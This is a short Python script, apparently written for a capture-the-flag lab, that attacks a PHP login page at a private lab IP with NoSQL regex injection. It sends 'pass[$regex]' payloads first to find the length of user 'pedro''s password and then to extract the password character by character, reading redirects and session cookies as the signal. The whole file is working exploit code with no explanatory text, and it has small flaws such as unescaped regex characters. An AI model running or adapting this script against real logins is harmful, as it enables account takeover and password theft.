import requests
import string

user='pedro'
headers = {'Content-Type': 'application/x-www-form-urlencoded'}
assumelength=''
i=0
while(True):
    
    print(f'trying : {i}')
    data = {'user':f'{user}','pass[$regex]':f'^.{{{i}}}$','remember':'on'}
    r = requests.post('http://10.10.166.249/login.php',data=data,allow_redirects=False)
    if r.status_code == 302 and r.cookies.get("PHPSESSID"):
        print(f'lenth is:{i}')
        print(r.headers)
        print(f'phpsessis : {r.cookies["PHPSESSID"]}')
        assumelength=i
        break
    i=i+1

charset = string.ascii_letters + string.digits + string.punctuation
password = ""
a = assumelength
while ( len(password)!=assumelength):
    for i in charset:
        if a >= 0:
            # a=a-1
            data = {'user':f'{user}','pass[$regex]':f'^{password}{i}{(a-1) *'.'}$','remember':'on'}
            # print(i)
            r = requests.post('http://10.10.166.249/login.php',data=data,allow_redirects=False)
            if r.status_code == 302 and r.cookies.get("PHPSESSID"):
                # print(i)
                # print(f'phpsessis : {r.cookies["PHPSESSID"]}')
                password= password + i
                print(password)
                a=a-1
                break













 

# r = requests.post('http://10.10.166.249/login.php',data=data,allow_redirects=False)


